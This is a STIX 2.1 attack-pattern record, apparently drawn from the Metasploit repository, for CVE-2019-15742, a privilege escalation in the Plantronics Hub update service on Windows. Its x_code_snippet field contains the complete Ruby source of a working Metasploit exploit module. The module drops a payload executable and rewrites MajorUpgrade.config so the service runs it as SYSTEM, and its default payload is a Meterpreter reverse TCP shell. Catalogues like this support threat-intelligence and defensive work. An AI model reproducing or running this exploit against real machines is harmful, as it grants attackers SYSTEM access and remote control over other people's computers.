{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8a485f3-e2d4-42e2-8de2-18546e36b5b5",
    "created": "2024-08-14T16:49:52.292367Z",
    "modified": "2024-08-14T16:49:52.29237Z",
    "name": "Plantronics Hub SpokesUpdateService Privilege Escalation",
    "description": " The Plantronics Hub client application for Windows makes use of an automatic update service `SpokesUpdateService.exe` which automatically executes a file specified in the `MajorUpgrade.config` configuration file as SYSTEM. The configuration file is writable by all users by default.  This module has been tested successfully on Plantronics Hub version 3.13.2 on Windows 7 SP1 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/plantronics_hub_spokesupdateservice_privesc.rb",
            "external_id": "plantronics_hub_spokesupdateservice_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-15742"
        },
        {
            "source_name": "reference",
            "url": "https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::Services\n  include Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Plantronics Hub SpokesUpdateService Privilege Escalation',\n        'Description' => %q{\n          The Plantronics Hub client application for Windows makes use of an\n          automatic update service `SpokesUpdateService.exe` which automatically\n          executes a file specified in the `MajorUpgrade.config` configuration\n          file as SYSTEM. The configuration file is writable by all users by default.\n\n          This module has been tested successfully on Plantronics Hub version 3.13.2\n          on Windows 7 SP1 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Markus Krell', # Discovery and PoC\n          'bcoles'        # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2019-15742'],\n          ['EDB', '47845'],\n          ['URL', 'https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf']\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [['Automatic', {}]],\n        'DisclosureDate' => '2019-08-30',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [false, 'A directory where we can write files (%TEMP% by default)', nil]),\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].blank? ? session.sys.config.getenv('TEMP') : datastore['WritableDir'].to_s\n  end\n\n  def check\n    service = 'PlantronicsUpdateService'\n\n    unless service_exists? service\n      return CheckCode::Safe(\"Service '#{service}' does not exist\")\n    end\n\n    path = \"#{session.sys.config.getenv('PROGRAMDATA')}\\\\Plantronics\\\\Spokes3G\"\n\n    unless exists? path\n      return CheckCode::Safe(\"Directory '#{path}' does not exist\")\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    unless check == CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_system?\n      fail_with Failure::BadConfig, 'Session already has SYSTEM privileges'\n    end\n\n    payload_path = \"#{base_dir}\\\\#{Rex::Text.rand_text_alphanumeric(8..10)}.exe\"\n    payload_exe = generate_payload_exe\n    vprint_status \"Writing payload to #{payload_path} ...\"\n    write_file payload_path, payload_exe\n    register_file_for_cleanup payload_path\n\n    config_path = \"#{session.sys.config.getenv('PROGRAMDATA')}\\\\Plantronics\\\\Spokes3G\\\\MajorUpgrade.config\"\n    vprint_status \"Writing configuration file to #{config_path} ...\"\n    write_file config_path, \"#{session.sys.config.getenv('USERNAME')}|advertise|#{payload_path}\"\n    register_file_for_cleanup config_path\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-08-30",
    "x_mitre_platforms": [
        "['win']"
    ]
}